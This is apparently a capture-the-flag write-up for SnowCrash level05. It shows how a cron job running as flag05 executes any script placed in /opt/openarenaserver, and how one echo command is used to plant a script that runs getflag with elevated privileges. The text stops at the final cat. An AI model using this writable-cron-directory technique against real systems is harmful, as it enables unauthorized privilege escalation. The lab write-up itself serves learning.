Using the technique of the Level01 we get the following result : 

level05@SnowCrash:~$ find / -user flag05 2> /dev/null 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

Both of the files contains the same shell script which is :

-----------------------------------------------------------
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
-----------------------------------------------------------

The code is straight forward :

Gets all file of the directory /opt/openarenaserver/ 
Set the CPU time limit to 5 Seconds
Execute the file that is being processed
Delete the file

When we create a simple file in /opt/openarenaserver and execute the program /usr/sbin/openarenaserver it says the following :

level05@SnowCrash:~$ /usr/sbin/openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied

So we do not have the correct writes.

We also have a file called level05 that is found by  the following command :

level05@SnowCrash:~$ find / -name level05 2> /dev/null 
/var/mail/level05
/rofs/var/mail/level05

This file contains the following content

level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

It looks like a cron job and according to crontab.guru our command means execute the command sh /usr/sbin/openarenaserver with the permission of flag05 every 2 minutes.

This means that each 2 minutes the script /usr/sbin/openarenaserver is getting executed.

So all we need to do is just put a shell script file that will call and save the output of the command getflag and wait for 2 minutes.

We can use the following command to create our script in /opt/openarenaserver/ :

echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05

And this will create a file called flag05 in the directort /tmp and when wee see the content of the flag05 file we get :

level05@SnowCrash:~$ cat /tmp/flag05
